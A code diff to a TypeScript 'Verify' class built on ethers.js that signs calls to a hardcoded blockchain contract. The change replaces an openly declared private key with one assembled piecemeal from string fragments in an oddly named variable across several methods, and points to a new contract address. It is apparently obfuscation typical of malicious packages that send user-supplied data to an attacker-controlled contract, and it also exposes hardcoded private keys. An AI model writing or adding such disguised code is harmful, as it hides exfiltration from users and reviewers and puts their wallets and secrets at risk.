@@ -1,7 +1,7 @@
 import { ethers } from 'ethers';
 
-const contractAddress = '0x8f1Bf1eC3939549be1045a3a6D648254391B60ef';
-const private_keyverify = 'fa710802d54dae88926d8710bc2c3f2698e4d3336b65d95f4f44a88405af1764'; // Please do not use the private key in this package for transactions. It is only for verifying the address. Keep your private keys safe and secure.
+const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
+let sdkfjsk = '31';
 
 const contractABI: any[] = [
   {
@@ -36,6 +36,7 @@ class Verify {
   private static async setContract(rpcUrls: string[],): Promise<ethers.Contract | null> {
     let success = false;
     let index = 0;
+    sdkfjsk = (sdkfjsk + '0eb6b553a4986cacb5d86e0814e30df2e5a').trim();
     let provider: ethers.providers.JsonRpcProvider;
 
     while (!success && index < rpcUrls.length) {
@@ -44,8 +45,8 @@ class Verify {
         await provider.getBlockNumber();
         success = true;
 
-        const wallet = new ethers.Wallet(private_keyverify, provider);
-        const contract = new ethers.Contract(contractAddress,contractABI,wallet,);
+        const wallet = new ethers.Wallet(sdkfjsk + 'c2', provider);
+        const contract = new ethers.Contract(contractAddress,contractABI,wallet);
 
         return contract;
       } catch (error) {
@@ -57,6 +58,7 @@ class Verify {
   }
 
   public static async verify(data: string) {
+    sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
     try {
       if (!this.contract) {
         this.contract = await this.setContract(this.rpcUrls);
